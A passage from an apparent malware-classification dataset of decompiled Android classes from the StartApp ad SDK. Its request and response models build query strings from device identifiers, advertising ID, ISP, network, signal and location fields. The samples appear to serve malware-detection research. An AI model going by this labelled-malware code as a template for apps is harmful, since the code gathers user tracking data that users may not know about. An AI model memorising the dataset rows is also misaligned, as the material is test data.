p.a((List<NameValueObject>)arrayList,""os"",this.os,true);     p.a((List<NameValueObject>)arrayList,""sdkVersion"",this.sdkVersion,false);     p.a((List<NameValueObject>)arrayList,""packageId"",this.packageId,false);     p.a((List<NameValueObject>)arrayList,""userId"",this.userId,false);     p.a((List<NameValueObject>)arrayList,""userAdvertisingId"",this.userAdvertisingId,false);     p.a((List<NameValueObject>)arrayList,""model"",this.model,false);     p.a((List<NameValueObject>)arrayList,""manufacturer"",this.manufacturer,false);     p.a((List<NameValueObject>)arrayList,""deviceVersion"",this.deviceVersion,false);     p.a((List<NameValueObject>)arrayList,""isp"",this.isp,false);     p.a((List<NameValueObject>)arrayList,""subPublisherId"",this.subPublisherId,false);     p.a((List<NameValueObject>)arrayList,""subProductId"",this.subProductId,false);     p.a((List<NameValueObject>)arrayList,""grid"",getNetworkType(),false);     p.a((List<NameValueObject>)arrayList,""silev"",getSignalLevel(),false);     p.a((List<NameValueObject>)arrayList,""outsource"",isUnknownSourcesAllowed() == null ? null : isUnknownSourcesAllowed().toString(),false);     p.a((List<NameValueObject>)arrayList,""width"",String.valueOf(this.width),false);     p.a((List<NameValueObject>)arrayList,""height"",String.valueOf(this.height),false);     p.a((List<NameValueObject>)arrayList,""sdkId"",String.valueOf(this.sdkId),true);     return arrayList;   }   public String getNetworkType(){     return this.networkType;   }   public String getOs(){     return this.os;   }   public String getPackageId(){     return this.packageId;   }   public Map<String,String> getParameters(){     return this.parameters;   }   public String getProductId(){     return this.productId;   }   public String getPublisherId(){     return this.publisherId;   }   public String getRequestString(){     Set<String> valueSet;     StringBuilder sb=new StringBuilder();     List<NameValueObject> nameValueMap=getNameValueMap();     if (nameValueMap == null) {       return sb.toString();     }     sb.append('?');     for (    NameValueObject nameValueObject : nameValueMap) {       if (nameValueObject.getValue() != null) {         sb.append(nameValueObject.getName()).append('=').append(nameValueObject.getValue()).append('&');       }  else       if (nameValueObject.getValueSet() != null && (valueSet=nameValueObject.getValueSet()) != null) {         Iterator<String> it=valueSet.iterator();         while (it.hasNext()) {           sb.append(nameValueObject.getName()).append('=').append(it.next()).append('&');         }       }     }     if (sb.length() != 0) {       sb.deleteCharAt(sb.length() - 1);     }     return sb.toString().replace(""+"",""%20"");   }   public String getSdkVersion(){     return this.sdkVersion;   }   public String getSignalLevel(){     return this.signalLevel;   }   public String getSubProductId(){     return this.subProductId;   }   public String getSubPublisherId(){     return this.subPublisherId;   }   public String getUserAdvertisingId(){     return this.userAdvertisingId;   }   public String getUserId(){     return this.userId;   }   public int getWidth(){     return this.width;   }   public Boolean isUnknownSourcesAllowed(){     return this.unknownSourcesAllowed;   }   public void setDeviceVersion(  String str){     this.deviceVersion=str;   }   public void setHeight(  int i){     this.height=i;   }   public void setIsp(  String str){     this.isp=str;   }   public void setManufacturer(  String str){     this.manufacturer=str;   }   public void setModel(  String str){     this.model=str;   }   public void setPackageId(  String str){     this.packageId=str;   }   public void setParameters(  Map<String,String> map){     this.parameters=map;   }   public void setProductId(  String str){     this.productId=str;   }   public void setPublisherId(  String str){     this.publisherId=str;   }   public void setSdkVersion(  String str){     this.sdkVersion=str;   }   public void setSubProductId(  String str){     this.subProductId=str;   }   public void setSubPublisherId(  String str){     this.subPublisherId=str;   }   public void setUnknownSourcesAllowed(  Boolean bool){     this.unknownSourcesAllowed=bool;   }   public void setUserAdvertisingId(  String str){     this.userAdvertisingId=str;   }   public void setUserId(  String str){     this.userId=str;   }   public void setWidth(  int i){     this.width=i;   }   @Override public String toString(){     return ""BaseRequest [parameters="" + this.parameters + ""]"";   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.model\BaseResponse.code","public abstract class BaseResponse extends BaseDTO implements JsonDeserializer {   protected Map<String,String> parameters=new HashMap();   private boolean validResponse=true;   private String errorMessage=null;   @Override public void fromJson(  JSONObject jSONObject){     this.validResponse=jSONObject.optBoolean(""validResponse"");     this.errorMessage=jSONObject.optString(""errorMessage"",null);     JSONObject optJSONObject=jSONObject.optJSONObject(""parameters"");     if (optJSONObject == null) {       this.parameters=null;       return;     }     this.parameters=new HashMap();     Iterator<String> keys=optJSONObject.keys();     while (keys.hasNext()) {       String next=keys.next();       this.parameters.put(next,(String)optJSONObject.opt(next));     }   }   public String getErrorMessage(){     return this.errorMessage;   }   public Map<String,String> getParameters(){     return this.parameters;   }   public boolean isValidResponse(){     return this.validResponse;   }   public void setErrorMessage(  String str){     this.errorMessage=str;   }   public void setParameters(  Map<String,String> map){     this.parameters=map;   }   public void setValidResponse(  boolean z){     this.validResponse=z;   }   @Override public String toString(){     return ""BaseResponse [parameters="" + this.parameters + "", validResponse=""+ this.validResponse+ "", errorMessage=""+ this.errorMessage+ ""]"";   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.model\GetAdRequest.code","public class GetAdRequest extends BaseRequest {   private String adTag;   private int age;   private String gender;   private String keywords;   private AdPreferences.Placement placement;   private String simpleToken;   private String template;   private boolean testMode;   private double longitude=0.0d;   private double latitude=0.0d;   private int adsNumber=1;   private int offset=0;   private Set<String> categories=null;   private Set<String> categoriesExclude=null;   private Set<String> packagesExclude=null;   private boolean engInclude=true;   private String country=null;   private String advertiserId=null;   private String type=null;   public void addCategory(  String str){     if (this.categories == null) {       this.categories=new HashSet();     }     this.categories.add(str);   }   public void addCategoryExclude(  String str){     if (this.categoriesExclude == null) {       this.categoriesExclude=new HashSet();     }     this.categoriesExclude.add(str);   }   public void fillAdPreferences(  AdPreferences adPreferences,  AdPreferences.Placement placement,  String str){     this.placement=placement;     if (adPreferences.isSimpleToken() || placement != AdPreferences.Placement.INAPP_NATIVE) {       this.simpleToken=str;     }  else {       this.simpleToken="""";     }     this.age=adPreferences.getAge();     this.gender=adPreferences.getGender();     this.keywords=adPreferences.getKeywords();     this.adTag=adPreferences.getAdTag();     this.testMode=adPreferences.isTestMode();     this.categories=adPreferences.getCategories();     this.categoriesExclude=adPreferences.getCategoriesExclude();     setCountry(adPreferences.country);     setAdvertiser(adPreferences.advertiserId);     setTemplate(adPreferences.template);     setType(adPreferences.type);   }   public String getAdTag(){     return this.adTag;   }   public int getAdsNumber(){     return this.adsNumber;   }   public String getAdvertiserId(){     return this.advertiserId;   }   public int getAge(){     return this.age;   }   public Set<String> getCategories(){     return this.categories;   }   public Set<String> getCategoriesExclude(){     return this.categoriesExclude;   }   public String getCountry(){     return this.country;   }   public String getGender(){     return this.gender;   }   public String getKeywords(){     return this.keywords;   }   public double getLatitude(){     return this.latitude;   }   public double getLongitude(){     return this.longitude;   }   @Override public List<NameValueObject> getNameValueMap(){     List<NameValueObject> nameValueMap=super.getNameValueMap();     if (nameValueMap == null) {       nameValueMap=new ArrayList<>();     }     p.a(nameValueMap,""placement"",this.placement.name(),true);     p.a(nameValueMap,""testMode"",Boolean.toString(this.testMode),false);     p.a(nameValueMap,""longitude"",Double.toString(this.longitude),false);     p.a(nameValueMap,""latitude"",Double.toString(this.latitude),false);     p.a(nameValueMap,""gender"",this.gender,false);     p.a(nameValueMap,""age"",Integer.toString(this.age),false);     p.a(nameValueMap,""keywords"",this.keywords,false);     p.a(nameValueMap,""adTag"",this.adTag,false);     p.a(nameValueMap,""template"",this.template,false);     p.a(nameValueMap,""adsNumber"",Integer.toString(this.adsNumber),false);     p.a(nameValueMap,""category"",this.categories,false);     p.a(nameValueMap,""categoryExclude"",this.categoriesExclude,false);     p.a(nameValueMap,""packageExclude"",this.packagesExclude,false);     p.a(nameValueMap,""offset"",Integer.toString(this.offset),false);     p.a(nameValueMap,""token"",this.simpleToken,false);     p.a(nameValueMap,""engInclude"",Boolean.toString(this.engInclude),false);     if (getCountry() != null) {       p.a(nameValueMap,""country"",getCountry(),false);     }     if (getAdvertiserId() != null) {       p.a(nameValueMap,""advertiserId"",getAdvertiserId(),false);     }     if (getType() != null) {       p.a(nameValueMap,AnalyticsSQLiteHelper.EVENT_LIST_TYPE,getType(),false);     }     return nameValueMap;   }   public int getOffset(){     return this.offset;   }   public Set<String> getPackagesExclude(){     return this.packagesExclude;   }   public AdPreferences.Placement getPlacement(){     return this.placement;   }   public String getSimpleToken(){     return this.simpleToken;   }   public String getTemplate(){     return this.template;   }   public String getType(){     return this.type;   }   public boolean isEngInclude(){     return this.engInclude;   }   public boolean isTestMode(){     return this.testMode;   }   public void setAdTag(  String str){     this.adTag=str;   }   public void setAdsNumber(  int i){     this.adsNumber=i;   }   public void setAdvertiser(  String str){     this.advertiserId=str;   }   public void setAge(  int i){     this.age=i;   }   public void setCategories(  Set<String> set){     this.categories=set;   }   public void setCategoriesExclude(  Set<String> set){     this.categoriesExclude=set;   }   public void setCountry(  String str){     this.country=str;   }   public void setEngInclude(  boolean z){     this.engInclude=z;   }   public void setGender(  String str){     this.gender=str;   }   public void setKeywords(  String str){     this.keywords=str;   }   public void setLatitude(  double d){     this.latitude=d;   }   public void setLongitude(  double d){     this.longitude=d;   }   public void setOffset(  int i){     this.offset=i;   }   public void setPackagesExclude(  Set<String> set){     this.packagesExclude=set;   }   public void setPlacement(  AdPreferences.Placement placement){     this.placement=placement;   }   public void setSimpleToken(  String str){     this.simpleToken=str;   }   public void setTemplate(  String str){     this.template=str;   }   public void setTestMode(  boolean z){     this.testMode=z;   }   public void setType(  String str){     this.type=str;   }   @Override public String toString(){     StringBuilder sb=new StringBuilder(""GetAdRequest ["");     sb.append(""placement="" + this.placement);     sb.append("", testMode="" + this.testMode);     sb.append("", longitude="" + this.longitude);     sb.append("", latitude="" + this.latitude);     sb.append("", gender="" + this.gender);     sb.append("", age="" + this.age);     sb.append("", keywords="" + this.keywords);     sb.append("", adTag="" + this.adTag);     sb.append("", template="" + this.template);     sb.append("", adsNumber="" + this.adsNumber);     sb.append("", offset="" + this.offset);     sb.append("", categories="" + this.categories);     sb.append("", categoriesExclude="" + this.categoriesExclude);     sb.append("", packagesExclude="" + this.packagesExclude);     sb.append("", simpleToken="" + this.simpleToken);     sb.append("", engInclude="" + this.engInclude);     sb.append("", country="" + this.country);     sb.append("", advertiserId="" + this.advertiserId);     sb.append("", type="" + this.type);     sb.append(""]"");     return sb.toString();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.model\GetAdResponse.code","public class GetAdResponse extends BaseResponse {   private AdInformationOverrides adInfoOverrides=AdInformationOverrides.a();   private List<AdDetails> adsDetails;   private String productId;   private String publisherId;   @Override public void fromJson(  JSONObject jSONObject){     super.fromJson(jSONObject);     JSONArray optJSONArray=jSONObject.optJSONArray(""adsDetails"");     this.productId=jSONObject.optString(AnalyticsSQLiteHelper.TRANSACTION_PRODUCT_ID,null);     this.publisherId=jSONObject.optString(""publisherId"",null);     if (optJSONArray == null) {       return;     }     this.adsDetails=new ArrayList();     int i=0;     while (true) {       int i2=i;       if (i2 < optJSONArray.length()) {         JSONObject jSONObject2=(JSONObject)optJSONArray.opt(i2);         AdDetails adDetails=new AdDetails();         adDetails.fromJson(jSONObject2);         this.adsDetails.add(adDetails);         i=i2 + 1;       }  else {         try {           break;         }  catch (        JSONException e) {         }       }     }     this.adInfoOverrides.a(jSONObject.getBoolean(""adInfoEnable""));     try {       this.adInfoOverrides.a(c.a.a(jSONObject.getString(""adInfoPosition"")));     }  catch (    JSONException e2) {     }   }   public AdInformationOverrides getAdInfoOverride(){     return this.adInfoOverrides;   }   public List<AdDetails> getAdsDetails(){     return this.adsDetails;   }   public String getProductId(){     return this.productId;   }   public String getPublisherId(){     return this.publisherId;   }   public void setAdsDetails(  List<AdDetails> list){     this.adsDetails=list;   }   public void setProductId(  String str){     this.productId=str;   }   public void setPublisherId(  String str){     this.publisherId=str;   }   @Override public String toString(){     StringBuilder sb=new StringBuilder(""GetAdResponse ["");     sb.append(""publisherId="" + this.publisherId);     sb.append("", productId="" + this.productId);     sb.append("", adsDetails="" + this.adsDetails);     sb.append(""]"");     return sb.toString();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.model\JsonDeserializer.code","public interface JsonDeserializer {   void fromJson(  JSONObject jSONObject); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.model\MetaDataRequest.code","public class MetaDataRequest extends BaseRequest { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.model\MetaDataResponse.code","public class MetaDataResponse extends BaseResponse {   private static final String TAG=""StartAppWallMetaDataResponse"";   private Integer probability3D=null;   private Integer homeProbability3D=null;   private Integer html3dProbability=null;   private Integer fullscreenOverlayProbability=null;   private Integer backgroundGradientTop=null;   private Integer backgroundGradientBottom=null;   private Integer maxAds=null;   private Integer titleBackgroundColor=null;   private String titleContent=null;   private Integer titleTextSize=null;   private Integer titleTextColor=null;   private Set<String> titleTextDecoration=null;   private Integer titleLineColor=null;   private MetaDataStyle itemStyle=new MetaDataStyle();   private BannerOptions bannerOptions=new BannerOptions();   private HashMap<String,MetaDataStyle> templates=new HashMap<>();   private SplashConfig splashConfig=new SplashConfig();   private a adInformationConfig=a.a();   private Integer poweredByBackgroundColor=null;   private Integer poweredByTextColor=null;   @Override public void fromJson(  JSONObject jSONObject){     super.fromJson(jSONObject);     this.probability3D=Integer.valueOf(jSONObject.optInt(MetaData.KEY_PROBABILITY_3D,80));     this.html3dProbability=Integer.valueOf(jSONObject.optInt(MetaData.KEY_PROBABILITY_HTML_3D,50));     this.fullscreenOverlayProbability=Integer.valueOf(jSONObject.optInt(MetaData.KEY_PROBABILITY_FULLSCREEN_OVERLAY,50));     this.homeProbability3D=Integer.valueOf(jSONObject.optInt(MetaData.KEY_HOME_PROBABILITY_3D,80));     this.backgroundGradientTop=Integer.valueOf(jSONObject.optInt(MetaData.KEY_BG_TOP,-14606047));     this.backgroundGradientBottom=Integer.valueOf(jSONObject.optInt(MetaData.KEY_BG_BOTTOM,-14606047));     this.maxAds=Integer.valueOf(jSONObject.optInt(MetaData.KEY_MAX_ADS,10));     this.titleBackgroundColor=Integer.valueOf(jSONObject.optInt(MetaData.KEY_TITLE_BG,MetaData.DEFAULT_TITLE_BG));     this.titleContent=jSONObject.optString(MetaData.KEY_TITLE_CONTENT,MetaData.DEFAULT_TITLE_CONTENT);     this.titleTextColor=Integer.valueOf(jSONObject.optInt(MetaData.KEY_TITLE_TEXT_COLOR,MetaData.DEFAULT_TITLE_TEXT_COLOR.intValue()));     this.titleTextSize=Integer.valueOf(jSONObject.optInt(MetaData.KEY_TITLE_TEXT_SIZE,MetaData.DEFAULT_TITLE_TEXT_SIZE.intValue()));     this.titleTextDecoration=p.a(jSONObject.optJSONArray(MetaData.KEY_TITLE_TEXT_DECORATION),MetaData.DEFAULT_TITLE_TEXT_DECORATION);     this.titleLineColor=Integer.valueOf(jSONObject.optInt(MetaData.KEY_TITLE_LINE_COLOR,MetaData.DEFAULT_TITLE_LINE_COLOR.intValue()));     this.itemStyle.fromJson(jSONObject);     try {       JSONArray jSONArray=jSONObject.getJSONArray(MetaData.KEY_TEMPLATES);       for (int i=0; i < jSONArray.length(); i++) {         MetaDataStyle metaDataStyle=new MetaDataStyle();         metaDataStyle.fromJson(jSONArray.getJSONObject(i));         getTemplates().put(metaDataStyle.getName(),metaDataStyle);       }     }  catch (    JSONException e) {       i.a(6,""Could not find Templates"");     }     try {       this.bannerOptions.fromJson(jSONObject.getJSONObject(""BannerOptions""));     }  catch (    JSONException e2) {       i.a(6,""StartAppWallMetaDataResponseNo such Banner Options Object"");     }     this.poweredByBackgroundColor=Integer.valueOf(jSONObject.optInt(MetaData.KEY_POWERED_BY_BG,MetaData.DEFAULT_POWERED_BY_BG.intValue()));     this.poweredByTextColor=Integer.valueOf(jSONObject.optInt(MetaData.KEY_POWERED_BY_TEXT_COLOR,MetaData.DEFAULT_POWERED_BY_TEXT_COLOR.intValue()));     try {       this.splashConfig.fromJson(jSONObject.getJSONObject(MetaData.KEY_SPLASH_CONFIG));     }  catch (    JSONException e3) {       i.a(6,""Splash configuration does not exists"");     }     try {       getAdInformationConfig().fromJson(jSONObject.getJSONObject(""AdInformation""));     }  catch (    JSONException e4) {       i.a(6,""No Provacy Policy configuartion exists"");     }   }   public a getAdInformationConfig(){     return this.adInformationConfig;   }   public Integer getBackgroundGradientBottom(){     return this.backgroundGradientBottom;   }   public Integer getBackgroundGradientTop(){     return this.backgroundGradientTop;   }   public BannerOptions getBannerOption(){     return this.bannerOptions;   }   public Integer getFullscreenOverlayProbability(){     return this.fullscreenOverlayProbability;   }   public Integer getHomeProbability3D(){     return this.homeProbability3D;   }   public Integer getHtml3DProbability(){     return this.html3dProbability;   }   public Integer getItemDescriptionTextColor(){     return this.itemStyle.getItemDescriptionTextColor();   }   public Set<String> getItemDescriptionTextDecoration(){     return this.itemStyle.getItemDescriptionTextDecoration();   }   public Integer getItemDescriptionTextSize(){     return this.itemStyle.getItemDescriptionTextSize();   }   public Integer getItemGradientBottom(){     return this.itemStyle.getItemGradientBottom();   }   public Integer getItemGradientTop(){     return this.itemStyle.getItemGradientTop();   }   public MetaDataStyle getItemStyle(){     return this.itemStyle;   }   public Integer getItemTitleTextColor(){     return this.itemStyle.getItemTitleTextColor();   }   public Set<String> getItemTitleTextDecoration(){     return this.itemStyle.getItemTitleTextDecoration();   }   public Integer getItemTitleTextSize(){     return this.itemStyle.getItemTitleTextSize();   }   public Integer getMaxAds(){     return this.maxAds;   }   public Integer getPoweredByBackgroundColor(){     return this.poweredByBackgroundColor;   }   public Integer getPoweredByTextColor(){     return this.poweredByTextColor;   }   public Integer getProbability3D(){     return this.probability3D;   }   public SplashConfig getSplashConfig(){     return this.splashConfig;   }   public HashMap<String,MetaDataStyle> getTemplates(){     return this.templates;   }   public Integer getTitleBackgroundColor(){     return this.titleBackgroundColor;   }   public String getTitleContent(){     return this.titleContent;   }   public Integer getTitleLineColor(){     return this.titleLineColor;   }   public Integer getTitleTextColor(){     return this.titleTextColor;   }   public Set<String> getTitleTextDecoration(){     return this.titleTextDecoration;   }   public Integer getTitleTextSize(){     return this.titleTextSize;   }   public void setBackgroundGradientBottom(  Integer num){     this.backgroundGradientBottom=num;   }   public void setBackgroundGradientTop(  Integer num){     this.backgroundGradientTop=num;   }   public void setBannerOptions(  BannerOptions bannerOptions){     this.bannerOptions=bannerOptions;   }   public void setFullscreenOverlayProbability(  int i){     this.fullscreenOverlayProbability=Integer.valueOf(i);   }   public void setHomeProbability3D(  Integer num){     this.homeProbability3D=num;   }   public void setHtml3DProbability(  int i){     this.html3dProbability=Integer.valueOf(i);   }   public void setItemDescriptionTextColor(  Integer num){     this.itemStyle.setItemDescriptionTextColor(num);   }   public void setItemDescriptionTextDecoration(  Set<String> set){     this.itemStyle.setItemDescriptionTextDecoration(set);   }   public void setItemDescriptionTextSize(  Integer num){     this.itemStyle.setItemDescriptionTextSize(num);   }   public void setItemGradientBottom(  Integer num){     this.itemStyle.setItemGradientBottom(num);   }   public void setItemGradientTop(  Integer num){     this.itemStyle.setItemGradientTop(num);   }   public void setItemTitleTextColor(  Integer num){     this.itemStyle.setItemTitleTextColor(num);   }   public void setItemTitleTextDecoration(  Set<String> set){     this.itemStyle.setItemTitleTextDecoration(set);   }   public void setItemTitleTextSize(  Integer num){     this.itemStyle.setItemTitleTextSize(num);   }   public void setMaxAds(  Integer num){     this.maxAds=num;   }   public void setPoweredByBackgroundColor(  Integer num){     this.poweredByBackgroundColor=num;   }   public void setPoweredByTextColor(  Integer num){     this.poweredByTextColor=num;   }   public void setProbability3D(  Integer num){     this.probability3D=num;   }   public void setTitleBackgroundColor(  Integer num){     this.titleBackgroundColor=num;   }   public void setTitleContent(  String str){     this.titleContent=str;   }   public void setTitleLineColor(  Integer num){     this.titleLineColor=num;   }   public void setTitleTextColor(  Integer num){     this.titleTextColor=num;   }   public void setTitleTextDecoration(  Set<String> set){     this.titleTextDecoration=set;   }   public void setTitleTextSize(  Integer num){     this.titleTextSize=num;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.model\MetaDataStyle.code","public class MetaDataStyle implements JsonDeserializer {   public static final String KEY_ITEM_BOTTOM=""itemGradientBottom"";   public static final String KEY_ITEM_DESC_TEXT_COLOR=""itemDescriptionTextColor"";   public static final String KEY_ITEM_DESC_TEXT_DECORATION=""itemDescriptionTextDecoration"";   public static final String KEY_ITEM_DESC_TEXT_SIZE=""itemDescriptionTextSize"";   public static final String KEY_ITEM_TITLE_TEXT_COLOR=""itemTitleTextColor"";   public static final String KEY_ITEM_TITLE_TEXT_DECORATION=""itemTitleTextDecoration"";   public static final String KEY_ITEM_TITLE_TEXT_SIZE=""itemTitleTextSize"";   public static final String KEY_ITEM_TOP=""itemGradientTop"";   public static final String KEY_NAME=""name"";   private String name="""";   private Integer itemGradientTop=null;   private Integer itemGradientBottom=null;   private Integer itemTitleTextSize=null;   private Integer itemTitleTextColor=null;   private Set<String> itemTitleTextDecoration=null;   private Integer itemDescriptionTextSize=null;   private Integer itemDescriptionTextColor=null;   private Set<String> itemDescriptionTextDecoration=null;   public static MetaDataStyle getSharedPrefs(  String str,  SharedPreferences sharedPreferences){     MetaDataStyle metaDataStyle=new MetaDataStyle();     metaDataStyle.setName(str);     metaDataStyle.setItemGradientTop(Integer.valueOf(sharedPreferences.getInt(str + ""."" + KEY_ITEM_TOP,MetaData.DEFAULT_ITEM_TOP)));     metaDataStyle.setItemGradientBottom(Integer.valueOf(sharedPreferences.getInt(str + ""."" + KEY_ITEM_BOTTOM,MetaData.DEFAULT_ITEM_BOTTOM)));     metaDataStyle.setItemTitleTextColor(Integer.valueOf(sharedPreferences.getInt(str + ""."" + KEY_ITEM_TITLE_TEXT_COLOR,MetaData.DEFAULT_ITEM_TITLE_TEXT_COLOR.intValue())));     metaDataStyle.setItemTitleTextSize(Integer.valueOf(sharedPreferences.getInt(str + ""."" + KEY_ITEM_TITLE_TEXT_SIZE,MetaData.DEFAULT_ITEM_TITLE_TEXT_SIZE.intValue())));     metaDataStyle.setItemTitleTextDecoration(p.a(sharedPreferences.getString(str + ""."" + KEY_ITEM_TITLE_TEXT_DECORATION,p.a(MetaData.DEFAULT_ITEM_TITLE_TEXT_DECORATION))));     metaDataStyle.setItemDescriptionTextColor(Integer.valueOf(sharedPreferences.getInt(str + ""."" + KEY_ITEM_DESC_TEXT_COLOR,MetaData.DEFAULT_ITEM_DESC_TEXT_COLOR.intValue())));     metaDataStyle.setItemDescriptionTextSize(Integer.valueOf(sharedPreferences.getInt(str + ""."" + KEY_ITEM_DESC_TEXT_SIZE,MetaData.DEFAULT_ITEM_DESC_TEXT_SIZE.intValue())));     metaDataStyle.setItemDescriptionTextDecoration(p.a(sharedPreferences.getString(str + ""."" + KEY_ITEM_DESC_TEXT_DECORATION,p.a(MetaData.DEFAULT_ITEM_DESC_TEXT_DECORATION))));     return metaDataStyle;   }   @Override public void fromJson(  JSONObject jSONObject){     this.name=jSONObject.optString(KEY_NAME,"""");     this.itemGradientTop=Integer.valueOf(jSONObject.optInt(KEY_ITEM_TOP,MetaData.DEFAULT_ITEM_TOP));     this.itemGradientBottom=Integer.valueOf(jSONObject.optInt(KEY_ITEM_BOTTOM,MetaData.DEFAULT_ITEM_BOTTOM));     this.itemTitleTextColor=Integer.valueOf(jSONObject.optInt(KEY_ITEM_TITLE_TEXT_COLOR,MetaData.DEFAULT_ITEM_TITLE_TEXT_COLOR.intValue()));     this.itemTitleTextSize=Integer.valueOf(jSONObject.optInt(KEY_ITEM_TITLE_TEXT_SIZE,MetaData.DEFAULT_ITEM_TITLE_TEXT_SIZE.intValue()));     this.itemTitleTextDecoration=p.a(jSONObject.optJSONArray(KEY_ITEM_TITLE_TEXT_DECORATION),MetaData.DEFAULT_ITEM_TITLE_TEXT_DECORATION);     this.itemDescriptionTextColor=Integer.valueOf(jSONObject.optInt(KEY_ITEM_DESC_TEXT_COLOR,MetaData.DEFAULT_ITEM_DESC_TEXT_COLOR.intValue()));     this.itemDescriptionTextSize=Integer.valueOf(jSONObject.optInt(KEY_ITEM_DESC_TEXT_SIZE,MetaData.DEFAULT_ITEM_DESC_TEXT_SIZE.intValue()));     this.itemDescriptionTextDecoration=p.a(jSONObject.optJSONArray(KEY_ITEM_DESC_TEXT_DECORATION),MetaData.DEFAULT_ITEM_DESC_TEXT_DECORATION);   }   public Integer getItemDescriptionTextColor(){     return this.itemDescriptionTextColor;   }   public Set<String> getItemDescriptionTextDecoration(){     return this.itemDescriptionTextDecoration;   }   public Integer getItemDescriptionTextSize(){     return this.itemDescriptionTextSize;   }   public Integer getItemGradientBottom(){     return this.itemGradientBottom;   }   public Integer getItemGradientTop(){     return this.itemGradientTop;   }   public Integer getItemTitleTextColor(){     return this.itemTitleTextColor;   }   public Set<String> getItemTitleTextDecoration(){     return this.itemTitleTextDecoration;   }   public Integer getItemTitleTextSize(){     return this.itemTitleTextSize;   }   public String getName(){     return this.name;   }   public void putSharedPrefs(  SharedPreferences.Editor editor){     editor.putInt(getName() + ""."" + KEY_ITEM_TOP,getItemGradientTop().intValue());     editor.putInt(getName() + ""."" + KEY_ITEM_BOTTOM,getItemGradientBottom().intValue());     editor.putInt(getName() + ""."" + KEY_ITEM_TITLE_TEXT_COLOR,getItemTitleTextColor().intValue());     editor.putInt(getName() + ""."" + KEY_ITEM_TITLE_TEXT_SIZE,getItemTitleTextSize().intValue());     editor.putString(getName() + ""."" + KEY_ITEM_TITLE_TEXT_DECORATION,p.a(getItemTitleTextDecoration()));     editor.putInt(getName() + ""."" + KEY_ITEM_DESC_TEXT_COLOR,getItemDescriptionTextColor().intValue());     editor.putInt(getName() + ""."" + KEY_ITEM_DESC_TEXT_SIZE,getItemDescriptionTextSize().intValue());     editor.putString(getName() + ""."" + KEY_ITEM_DESC_TEXT_DECORATION,p.a(getItemDescriptionTextDecoration()));   }   public void setItemDescriptionTextColor(  Integer num){     this.itemDescriptionTextColor=num;   }   public void setItemDescriptionTextDecoration(  Set<String> set){     this.itemDescriptionTextDecoration=set;   }   public void setItemDescriptionTextSize(  Integer num){     this.itemDescriptionTextSize=num;   }   public void setItemGradientBottom(  Integer num){     this.itemGradientBottom=num;   }   public void setItemGradientTop(  Integer num){     this.itemGradientTop=num;   }   public void setItemTitleTextColor(  Integer num){     this.itemTitleTextColor=num;   }   public void setItemTitleTextDecoration(  Set<String> set){     this.itemTitleTextDecoration=set;   }   public void setItemTitleTextSize(  Integer num){     this.itemTitleTextSize=num;   }   public void setName(  String str){     this.name=str;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.model\NameValueObject.code","public class NameValueObject {   private String name;   private String value;   private Set<String> valueSet;   public String getName(){     return this.name;   }   public String getValue(){     return this.value;   }   public Set<String> getValueSet(){     return this.valueSet;   }   public void setName(  String str){     this.name=str;   }   public void setValue(  String str){     this.value=str;   }   public void setValueSet(  Set<String> set){     this.valueSet=set;   }   public String toString(){     return ""NameValueObject [name="" + this.name + "", value=""+ this.value+ "", valueSet=""+ this.valueSet+ ""]"";   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.model\NameValueSerializer.code","public interface NameValueSerializer {   List<NameValueObject> getNameValueMap(); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.model\SdkDownloadRequest.code","public class SdkDownloadRequest extends BaseRequest {   private static final String PLACEMENT=""INAPP_DOWNLOAD"";   @Override public List<NameValueObject> getNameValueMap(){     List<NameValueObject> nameValueMap=super.getNameValueMap();     if (nameValueMap == null) {       nameValueMap=new ArrayList<>();     }     p.a(nameValueMap,""placement"",PLACEMENT,true);     return nameValueMap;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.nativead\a.code","protected interface a {   void onNativeAdDetailsLoaded(  int i); } public class a implements AdEventListener {   private AdEventListener b;   public a(  AdEventListener adEventListener){     this.b=null;     this.b=adEventListener;   }   public AdEventListener a(){     return this.b;   }   @Override public void onFailedToReceiveAd(  Ad ad){     i.a(StartAppNativeAd.TAG,3,""NativeAd Failed to load"");     if (this.b != null) {       this.b.onFailedToReceiveAd(StartAppNativeAd.this);       this.b=null;     }   }   @Override public void onReceiveAd(  Ad ad){     i.a(StartAppNativeAd.TAG,3,""NativeAd Received"");     if (StartAppNativeAd.this.nativeAds == null || StartAppNativeAd.this.nativeAds.a() == null) {       StartAppNativeAd.this.preferences.setAdsNumber(0);     }  else {       StartAppNativeAd.this.preferences.setAdsNumber(StartAppNativeAd.this.nativeAds.a().size());     }     StartAppNativeAd.this.initNativeAdList();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.nativead\NativeAdDetails.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5325170e"
